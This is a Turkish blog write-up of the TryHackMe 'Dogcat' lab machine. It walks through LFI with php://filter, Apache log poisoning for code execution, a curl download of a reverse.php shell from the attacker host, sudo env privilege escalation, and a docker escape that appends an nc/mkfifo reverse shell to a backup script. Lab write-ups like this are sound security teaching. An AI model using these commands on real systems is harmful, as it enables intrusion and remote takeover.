---
title: "THM Dogcat Write Up"
date: 2020-10-14T21:45:22+03:00
draft: false
toc: true
images:
tags: [Tryhackme,write-up,Lfi,docker,sudo,Rce,Php-filter] 
categories: [write-up]
author : "Barcode"
Description : "Merhaba, Bu yazımda sizlere Tryhackme'de yer alan orta seviye zorluktaki [DogCat](https://tryhackme.com/room/dogcat) adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar..."
cover : images/thm/dogcat/cover.png
  
---

*Merhaba, Bu yazımda sizlere Tryhackme'de yer alan orta seviye zorluktaki [DogCat](https://tryhackme.com/room/dogcat) adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar...*

## 1. Keşif Aşaması

Nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.

```bash
sudo nmap -sV -sC 10.10.35.38
```

{{< image src="/images/thm/dogcat/nmap.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

Sistemde sadece 2 port açıktır. Web sayfasına giriş yapılır. Anasayfada yer alan dog ve cat butonlarına tıklanarak adres çubuğuna dikkatle bakılır.

{{< image src="/images/thm/dogcat/web1.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}
<br>
{{< image src="/images/thm/dogcat/web2.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

LFI zafiyeti kontrolü için /etc/passwd dosyası okunmaya çalışılır.

{{< image src="/images/thm/dogcat/lfi1.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

Dog ve cat dışındaki dosyalar filtreye takılımaktadır. Dog ibaresi eklenerek test tekrarlanır.

{{< image src="/images/thm/dogcat/lfi2.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

Dog ve cat filtresi baypass edilidiğinde dosyaya otomatik olarak .php uzantısı eklendiği görülmektedir. Php filter kullanılarak index.php dosyası okunmaya çalışılır.

```url
?view=php://filter/convert.base64-encode/resource=./dog/../index
```

index.php dosyası başarılı bir şekilde okunur. Sonuç base64 ile decode edilir. Index.php içerisindeki php kodları incelenir.

```php
<?php
    function containsStr($str, $substr) {
        return strpos($str, $substr) !== false;
    }
    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
    if(isset($_GET['view'])) {
        if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
            echo 'Here you go!';
            include $_GET['view'] . $ext;
        } else {
            echo 'Sorry, only dogs or cats are allowed.';
        }
    }
?>
```
**containsStr()** metodu ile dog ve cat ifadeleri kontrol edilmektedir. Get isteğinde **ext** parametresi yok ise php uzantısının otomatik olarak eklendiği görülmektedir. İstek yapılırken **&ext** kullanılarak uzantı ekleme kısmı baypass edilir.

*LFI zafiyetinden RCE (Remote Code Execution) oluşturabilmek için tarayıcıdan LFI ile okunabilen bir dosyaya php kodu enjekte edilmelidir. Apache logları kontrol edilir. Özellikle access.log dosyasında web servisine atılan tüm isteklerin header bilgileri kayıt edilmektedir. Log dosyası okunmaya çalışılır.*

```url
?view=./dog/../../../../var/log/apache2/access.log&ext=
```
{{< image src="/images/thm/dogcat/logpage.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

Log içeriklerine bakıldığında ***User-Agent*** bilgisininde kayıt edildiği görülmektedir. User-Agent bilgisi kod çalıştırabilecek bir php kodu ile değiştirilip istek atıldığında isteğin başlık bilgisi, log dosyasına kayıt edilir. İşlem Burpsuite aracı kullanılarak yapılır.

{{< image src="/images/thm/dogcat/user.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

Daha sonra test için cmd parametresine id değeri verilerek apache access log dosyası okunmaya çalışılır.

```url
?view=./dog/../../../../var/log/apache2/access.log&ext=&cmd=id
```
{{< image src="/images/thm/dogcat/id.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

id komutu başarılı ile çalışmaktadır. Bu aşamadan sonra shell bağlantısı için birçok yol izlenebilir. Biz burada sisteme dosya upload ederek shell bağlantısı alacağız. 

Localhostta python3 http.server modulü kullanılarak web sunucusu ayağa kaldırılır. Daha sonra
 ```
&cmd=curl http://10.9.62.67:8000/reverse.php -o reverse.php 
``` 
komutu adres çubuğuna eklenir.

```url
?view=./dog/../../../../var/log/apache2/access.log&ext=&&cmd=curl http://10.9.62.67:8000/reverse.php -o reverse.php
```
{{< image src="/images/thm/dogcat/server.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

## 2. Erişim Sağlanması

Ayarlanan port dinlemeye başlanır. Daha sonra tarayıcıdan yüklenen dosyaya istek atılır ve shell bağlantısı sağlanır.

```http://10.10.35.38/reverse.php```

{{< image src="/images/thm/dogcat/shell.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

Web dizine bakıldığında birinci flag dosyası okunur.

{{< image src="/images/thm/dogcat/flag1.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}


## 3. Yetki Yükseltme

`sudo -l` komutu ile *www-data* kullanısının yetkileri kontrol edilir. **env** komutunun parola gerektirmeden root yetkisi ile çalıştırılabileceği tespit edilir.

{{< image src="/images/thm/dogcat/priv.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

Aşağıdaki komut ile ***env*** uygulaması ile yetki yükseltilir. 

```bash
sudo /usr/bin/env /bin/bash 
```
{{< image src="/images/thm/dogcat/root1.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

**find** komutu ile sistemdeki diğer flag dosyaları aranır. flag2 ve flag3 dosyaları tespit edilir. Root yetkisinde olduğumuzdan flaglar kolayca okunur.

{{< image src="/images/thm/dogcat/flags.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

Makinadaki toplam 4 adet flag dosyasından 3 tanesi tespit edilmiştir. 

{{< image src="/images/thm/dogcat/makina.png" alt="Hello Friend" position="center" >}}

Makina adına dikkatlice bakıldığında docker container içerisinde olduğumuz görülmektedir. Diğer flag dosyası için container dışına çıkmamız gerekmektedir.

**/opt** dizini kontrol edildiğinde backups klasörü dikkat çekmektedir. Dizin içeriğine bakıldığında backup.sh adında shell script bulunmaktadır.

{{< image src="/images/thm/dogcat/backup.png" alt="Hello Friend" position="center" style="border-radius: 5px;" >}}

*/root/container* dizini ile container içerisinde yer alan */opt/backup* dizininin volume oluşturularak bağlandığı görülmektedir. Dizindeki backup.sh dosyasına shell kodu eklenerek containerdan dışarı çıkılır.

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.62.67 5555 >/tmp/f" >> backup.sh
```
nc ile 5555 port dinlenir. backup.sh dosyası containerın çalıştığı host tarafından düzenli olarak çalıştırılmaktadır. (Öyle tahmin ederek bağlantı gelmesi beklenir :shushing_face:)

{{< image src="/images/thm/dogcat/root2.png" alt="Hello Friend" position="center" style="border-radius: 5px;" >}}

Kısa bir süre sonra ana makinadan shell bağlantısı alınır. Root dizini kontrol edilerek 4. flag dosyası okunur.


{{< image src="/images/thm/dogcat/rootdir.png" alt="Hello Friend" position="center" style="border-radius: 5px;" >}}
<br>
{{< image src="/images/thm/dogcat/rootflagg.png" alt="Hello Friend" position="center" style="border-radius: 5px;" >}}












